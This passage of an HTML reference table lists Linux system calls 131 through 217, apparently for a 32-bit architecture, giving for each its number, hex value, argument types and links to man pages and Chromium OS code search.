align="center">0x82</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">131</td><td>quotactl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/quotactl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*quotactl">cs/</a></td><td align="center">0x83</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td>-</td><td>-</td></tr><tr><td align="center">132</td><td>getpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgid">cs/</a></td><td align="center">0x84</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">133</td><td>fchdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchdir">cs/</a></td><td align="center">0x85</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">134</td><td>bdflush</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bdflush.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bdflush">cs/</a></td><td align="center">0x86</td><td>int func</td><td>long data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">135</td><td>sysfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysfs">cs/</a></td><td align="center">0x87</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">136</td><td>personality</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/personality.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*personality">cs/</a></td><td align="center">0x88</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">137</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x89</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">138</td><td>setfsuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid">cs/</a></td><td align="center">0x8a</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">139</td><td>setfsgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid">cs/</a></td><td align="center">0x8b</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">140</td><td>_llseek</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_llseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_llseek">cs/</a></td><td align="center">0x8c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">141</td><td>getdents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents">cs/</a></td><td align="center">0x8d</td><td>unsigned int fd</td><td>struct linux_dirent *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">142</td><td>_newselect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_newselect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_newselect">cs/</a></td><td align="center">0x8e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">143</td><td>flock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flock">cs/</a></td><td align="center">0x8f</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">144</td><td>msync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msync">cs/</a></td><td align="center">0x90</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">145</td><td>readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readv">cs/</a></td><td align="center">0x91</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">146</td><td>writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*writev">cs/</a></td><td align="center">0x92</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">147</td><td>getsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsid">cs/</a></td><td align="center">0x93</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">148</td><td>fdatasync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fdatasync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fdatasync">cs/</a></td><td align="center">0x94</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">149</td><td>_sysctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_sysctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_sysctl">cs/</a></td><td align="center">0x95</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">150</td><td>mlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock">cs/</a></td><td align="center">0x96</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">151</td><td>munlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlock">cs/</a></td><td align="center">0x97</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">152</td><td>mlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlockall">cs/</a></td><td align="center">0x98</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">153</td><td>munlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlockall">cs/</a></td><td align="center">0x99</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">154</td><td>sched_setparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setparam">cs/</a></td><td align="center">0x9a</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">155</td><td>sched_getparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getparam">cs/</a></td><td align="center">0x9b</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">156</td><td>sched_setscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setscheduler">cs/</a></td><td align="center">0x9c</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">157</td><td>sched_getscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getscheduler">cs/</a></td><td align="center">0x9d</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">158</td><td>sched_yield</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_yield.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_yield">cs/</a></td><td align="center">0x9e</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">159</td><td>sched_get_priority_max</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_max.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_max">cs/</a></td><td align="center">0x9f</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">160</td><td>sched_get_priority_min</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_min.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_min">cs/</a></td><td align="center">0xa0</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">161</td><td>sched_rr_get_interval</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_rr_get_interval.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_rr_get_interval">cs/</a></td><td align="center">0xa1</td><td>pid_t pid</td><td>struct __kernel_timespec *interval</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">162</td><td>nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nanosleep">cs/</a></td><td align="center">0xa2</td><td>struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">163</td><td>mremap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mremap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mremap">cs/</a></td><td align="center">0xa3</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td>-</td></tr><tr><td align="center">164</td><td>setresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid">cs/</a></td><td align="center">0xa4</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">165</td><td>getresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid">cs/</a></td><td align="center">0xa5</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">166</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xa6</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">167</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xa7</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">168</td><td>poll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/poll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*poll">cs/</a></td><td align="center">0xa8</td><td>struct pollfd *ufds</td><td>unsigned int nfds</td><td>int timeout</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">169</td><td>nfsservctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nfsservctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nfsservctl">cs/</a></td><td align="center">0xa9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">170</td><td>setresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid">cs/</a></td><td align="center">0xaa</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">171</td><td>getresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid">cs/</a></td><td align="center">0xab</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">172</td><td>prctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prctl">cs/</a></td><td align="center">0xac</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">173</td><td>rt_sigreturn</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigreturn">cs/</a></td><td align="center">0xad</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">174</td><td>rt_sigaction</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigaction">cs/</a></td><td align="center">0xae</td><td>int</td><td>const struct sigaction *</td><td>struct sigaction *</td><td>size_t</td><td>-</td><td>-</td></tr><tr><td align="center">175</td><td>rt_sigprocmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigprocmask">cs/</a></td><td align="center">0xaf</td><td>int how</td><td>sigset_t *set</td><td>sigset_t *oset</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">176</td><td>rt_sigpending</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigpending">cs/</a></td><td align="center">0xb0</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">177</td><td>rt_sigtimedwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigtimedwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigtimedwait">cs/</a></td><td align="center">0xb1</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct __kernel_timespec *uts</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">178</td><td>rt_sigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigqueueinfo">cs/</a></td><td align="center">0xb2</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">179</td><td>rt_sigsuspend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigsuspend">cs/</a></td><td align="center">0xb3</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">180</td><td>pread64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pread64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pread64">cs/</a></td><td align="center">0xb4</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">181</td><td>pwrite64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwrite64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwrite64">cs/</a></td><td align="center">0xb5</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">182</td><td>chown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chown">cs/</a></td><td align="center">0xb6</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">183</td><td>getcwd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcwd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcwd">cs/</a></td><td align="center">0xb7</td><td>char *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">184</td><td>capget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capget">cs/</a></td><td align="center">0xb8</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">185</td><td>capset</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capset.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capset">cs/</a></td><td align="center">0xb9</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">186</td><td>sigaltstack</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaltstack.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaltstack">cs/</a></td><td align="center">0xba</td><td>const struct sigaltstack *uss</td><td>struct sigaltstack *uoss</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">187</td><td>sendfile</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile">cs/</a></td><td align="center">0xbb</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td align="center">188</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xbc</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">189</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xbd</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">190</td><td>vfork</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vfork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vfork">cs/</a></td><td align="center">0xbe</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">191</td><td>ugetrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ugetrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ugetrlimit">cs/</a></td><td align="center">0xbf</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">192</td><td>mmap2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mmap2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mmap2">cs/</a></td><td align="center">0xc0</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">193</td><td>truncate64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate64">cs/</a></td><td align="center">0xc1</td><td>const char *path</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">194</td><td>ftruncate64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate64">cs/</a></td><td align="center">0xc2</td><td>unsigned int fd</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">195</td><td>stat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stat64">cs/</a></td><td align="center">0xc3</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">196</td><td>lstat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lstat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lstat64">cs/</a></td><td align="center">0xc4</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">197</td><td>fstat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat64">cs/</a></td><td align="center">0xc5</td><td>unsigned long fd</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">198</td><td>lchown32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lchown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lchown32">cs/</a></td><td align="center">0xc6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">199</td><td>getuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid32">cs/</a></td><td align="center">0xc7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">200</td><td>getgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid32">cs/</a></td><td align="center">0xc8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">201</td><td>geteuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid32">cs/</a></td><td align="center">0xc9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">202</td><td>getegid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid32">cs/</a></td><td align="center">0xca</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">203</td><td>setreuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid32">cs/</a></td><td align="center">0xcb</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">204</td><td>setregid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid32">cs/</a></td><td align="center">0xcc</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">205</td><td>getgroups32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups32">cs/</a></td><td align="center">0xcd</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">206</td><td>setgroups32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups32">cs/</a></td><td align="center">0xce</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">207</td><td>fchown32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown32">cs/</a></td><td align="center">0xcf</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">208</td><td>setresuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid32">cs/</a></td><td align="center">0xd0</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">209</td><td>getresuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid32">cs/</a></td><td align="center">0xd1</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">210</td><td>setresgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid32">cs/</a></td><td align="center">0xd2</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">211</td><td>getresgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid32">cs/</a></td><td align="center">0xd3</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">212</td><td>chown32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chown32">cs/</a></td><td align="center">0xd4</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">213</td><td>setuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid32">cs/</a></td><td align="center">0xd5</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">214</td><td>setgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid32">cs/</a></td><td align="center">0xd6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">215</td><td>setfsuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid32">cs/</a></td><td align="center">0xd7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">216</td><td>setfsgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid32">cs/</a></td><td align="center">0xd8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">217</td><td>getdents64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents64">cs/</a></td><td align="center">0xd9</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int 